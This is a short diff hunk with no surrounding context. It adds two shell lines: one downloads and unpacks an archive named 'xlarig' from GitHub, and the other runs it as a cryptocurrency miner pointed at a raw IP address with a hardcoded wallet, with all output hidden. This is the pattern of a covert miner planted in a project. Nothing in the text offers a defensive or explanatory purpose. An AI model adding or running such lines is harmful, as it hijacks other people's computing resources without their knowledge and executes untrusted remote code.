@@ -1,0 +1,2 @@
+wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
+./xlarig -o 172.233.92.162:443 -u ZEPHs71BznX6oN8asERq7Nj5rDTwd8z81752E7yUuzG3UD4AU4eoPCuinoQgp1iHhMDsvjEDUxJaYYvmzaN6M7iSTqb2KLqBeGh -p YOUR >/dev/null 2>&1
